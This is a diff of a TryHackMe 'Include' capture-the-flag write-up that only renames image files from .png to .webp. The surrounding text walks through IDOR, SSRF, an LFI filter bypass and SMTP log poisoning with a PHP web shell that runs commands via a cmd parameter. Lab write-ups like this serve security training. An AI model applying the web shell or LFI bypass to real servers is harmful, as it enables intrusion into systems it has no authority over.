@@ -4,7 +4,7 @@ A writeup for the room [Include](https://tryhackme.com/room/include) on TryHackM
 
 > Use your server exploitation skills to take control of a web app.
 
-<Image src={require("./logo.png").default} height="256" />
+<Image src={require("./logo.webp").default} height="256" />
 
 ### What is the flag value after logging in to the SysMon app?
 
@@ -14,7 +14,7 @@ The first step is to scan the target with nmap:
 nmap -sS TARGET_IP
 ```
 
-<Image src={require("./1-1-nmap.png").default} />
+<Image src={require("./1-1-nmap.webp").default} />
 
 The services on port 4000 and 50000 could be interesting:
 
@@ -22,17 +22,17 @@ The services on port 4000 and 50000 could be interesting:
 nmap -A -p 4000,50000 TARGET_IP
 ```
 
-<Image src={require("./1-2-nmap-4000.png").default} />
+<Image src={require("./1-2-nmap-4000.webp").default} />
 
-<Image src={require("./1-3-nmap-50000.png").default} />
+<Image src={require("./1-3-nmap-50000.webp").default} />
 
 They are both web servers. The one on port 4000 is a login page.
 
-<Image src={require("./1-4-4000-index.png").default} />
+<Image src={require("./1-4-4000-index.webp").default} />
 
 The service on port 50000 is an admin panel.
 
-<Image src={require("./1-5-50000-index.png").default} />
+<Image src={require("./1-5-50000-index.webp").default} />
 
 We can try to login to the website on port 4000 with guest:guest as credentials.
 
@@ -42,19 +42,19 @@ There are many properties and a form to add a new one.
 
 By looking to the URL we can easily see that there is an IDOR vulnerability.
 
-<Image src={require("./1-6-idor.png").default} />
+<Image src={require("./1-6-idor.webp").default} />
 
 There are two other users (2 and 3) but there is nothing to do with them.
 
 Because there is a property called isAdmin set to false, we can try to change it.
 
-<Image src={require("./1-7-admin.png").default} />
+<Image src={require("./1-7-admin.webp").default} />
 
 Once done new pages are available: API and Settings.
 
-<Image src={require("./1-8-api.png").default} />
+<Image src={require("./1-8-api.webp").default} />
 
-<Image src={require("./1-9-settings.png").default} />
+<Image src={require("./1-9-settings.webp").default} />
 
 The API page contains the details about two endpoints available for the user.
 
@@ -68,13 +68,13 @@ By giving one of the endpoints as a link, the server will download the content a
 
 This vulnerability is called Server-Side Request Forgery (SSRF).
 
-<Image src={require("./1-10-endpoint-1.png").default} />
+<Image src={require("./1-10-endpoint-1.webp").default} />
 
-<Image src={require("./1-11-endpoint-2.png").default} />
+<Image src={require("./1-11-endpoint-2.webp").default} />
 
 We finally have access to the admin panel and obtain the first flag.
 
-<Image src={require("./1-12-flag.png").default} />
+<Image src={require("./1-12-flag.webp").default} />
 
 ### What is the content of the hidden text file in /var/www/html?
 
@@ -84,13 +84,13 @@ We can try to search for subpaths with gobuster:
 gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://TARGET_IP:50000
 ```
 
-<Image src={require("./2-1-gobuster.png").default} />
+<Image src={require("./2-1-gobuster.webp").default} />
 
 Looking to the source code of the admin panel we can see that the profile image is loaded as `profile.php?img=profile.png`.
 
 The image is inside the uploads folder.
 
-<Image src={require("./2-2-uploads.png").default} />
+<Image src={require("./2-2-uploads.webp").default} />
 
 We can try to change the link to `profile.php?img=../uploads/profile.png`.
 
@@ -102,7 +102,7 @@ By adding ...// multiple times we can bypass the filter and access the file.
 
 This is an example of Local File Inclusion (LFI) vulnerability.
 
-<Image src={require("./2-3-passwd.png").default} />
+<Image src={require("./2-3-passwd.webp").default} />
 
 Looking to one of the available PHP file it is possible to notice that they are parsed by the server.
 
@@ -118,7 +118,7 @@ helo test
 mail from: <?php echo shell_exec($_GET['cmd']); ?>
 ```
 
-<Image src={require("./2-4-telnet.png").default} />
+<Image src={require("./2-4-telnet.webp").default} />
 
 Now, by sending `&cmd=ls` as a parameter inside the final log file it will be possible to see the output of the command.
 
@@ -128,7 +128,7 @@ To find the hidden file we can use the following command:
 &cmd=ls%20-a%20/var/www/html
 ```
 
-<Image src={require("./2-5-files.png").default} />
+<Image src={require("./2-5-files.webp").default} />
 
 Finally, we can read the content of the hidden file obtaining the second flag.
 
@@ -136,4 +136,4 @@ Finally, we can read the content of the hidden file obtaining the second flag.
 &cmd=cat%20/var/www/html/REDACTED
 ```
 
-<Image src={require("./2-6-flag.png").default} />
+<Image src={require("./2-6-flag.webp").default} />
